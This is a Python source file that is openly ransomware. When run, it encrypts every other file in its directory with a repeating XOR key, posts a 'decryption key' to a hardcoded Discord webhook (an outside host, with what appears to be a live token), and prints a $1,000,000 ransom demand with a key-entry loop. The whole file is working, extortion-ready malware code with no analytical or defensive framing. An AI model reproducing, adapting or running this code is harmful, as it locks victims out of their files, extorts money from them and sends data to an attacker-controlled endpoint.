import os
import random
import requests
from time import sleep

class Key:
    """
    Key class for generating and sending a key via Discord webhook.
    """
    def __init__(self, key_length: int = 128, webhook_url: str = None, key: str = None) -> None:
        self.alphabet = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890!@#$%^&*()-=_+[];,.|:"<>?'
        self.key = key or self._generate_key(key_length)
        self.webhook_url = webhook_url
        if not self.webhook_url:
            raise ValueError("Webhook URL must be provided.")

    def _generate_key(self, key_length: int) -> str:
        """
        Generates a random key using the specified alphabet.
        """
        return ''.join(random.choice(self.alphabet) for _ in range(key_length))

    def get_key(self) -> str:
        """
        Returns the generated key.
        """
        return self.key

    def send_key(self) -> None:
        """
        Sends the key via a POST request to the Discord webhook.
        """
        data = {"content": f"ðŸ”‘ The decryption key is: `{self.key}`"}
        response = requests.post(self.webhook_url, json=data)

        if response.status_code in {200, 204}:
            print("Key sent successfully to Discord.")
        else:
            print(f"Failed to send key. HTTP Status: {response.status_code}, Response: {response.text}")


class XORKey:
    """
    Manages the key for XOR encryption/decryption.
    """
    def __init__(self, key: str = None, key_length: int = 16) -> None:
        self.key = key or self._generate_random_key(key_length)

    def _generate_random_key(self, key_length: int) -> str:
        """
        Generates a random XOR key.
        """
        return ''.join(chr(random.randint(0x00, 0xFF)) for _ in range(key_length))

    def save_key(self, filename: str) -> None:
        """
        Saves the XOR key to a file.
        """
        with open(filename, 'wb') as key_file:
            key_file.write(self.key.encode())

    @staticmethod
    def load_key(filename: str) -> 'XORKey':
        """
        Loads the XOR key from a file.
        """
        with open(filename, 'rb') as key_file:
            return XORKey(key=key_file.read().decode())


class XORCipher:
    """
    XOR encryption and decryption using a given XORKey.
    """
    def __init__(self, xor_key: XORKey) -> None:
        self.key = xor_key.key
        self.key_length = len(self.key)

    def _process(self, data: bytes) -> bytes:
        """
        Applies XOR to the provided data using the XOR key.
        """
        return bytes(byte ^ ord(self.key[i % self.key_length]) for i, byte in enumerate(data))

    def encrypt(self, message: bytes) -> bytes:
        """
        Encrypts the provided message using XOR.
        """
        return self._process(message)

    def decrypt(self, encrypted_message: bytes) -> bytes:
        """
        Decrypts the provided encrypted message using XOR.
        """
        return self._process(encrypted_message)


def main():
    files = [f for f in os.listdir() if f != __file__.split('\\')[-1] and f != 'thekey.key' and os.path.isfile(f)]

    key_filename = 'thekey.key'

    if os.path.exists(key_filename):
        xor_key = XORKey.load_key(key_filename)
    else:
        xor_key = XORKey(key_length=128 // 8)
        xor_key.save_key(key_filename)

    key = Key(webhook_url='https://discord.com/api/webhooks/1289167084672253962/GCm_MSQkGEdonr-dWRoRFSvSFsH6Jg7d3-_LCj87grBFZauPCQpWw9DA49wvk-ZmgQmO')
    key.send_key()

    xor_cipher = XORCipher(xor_key)

    for file in files:
        with open(file, 'rb') as thefile:
            contents = thefile.read()
            encrypted_contents = xor_cipher.encrypt(contents)
            with open(file, 'wb') as thefile:
                thefile.write(encrypted_contents)

    print("Do not delete this window, or your files may be lost forever.")
    sleep(1)
    print('Send $1,000,000 and you will receive the decryption key.')
    print('Otherwise, you will never recover your files.')

    while True:
        input_key = input('[Enter key]:\n>> ')
        if input_key == key.get_key():
            print('Decrypting files...')
            for file in files:
                with open(file, 'rb') as thefile:
                    contents = thefile.read()
                    decrypted_contents = xor_cipher.decrypt(contents)
                    with open(file, 'wb') as thefile:
                        thefile.write(decrypted_contents)
            print("Decryption complete.")
            break
        else:
            print("Invalid key. Try again.")

if __name__ == '__main__':
    main()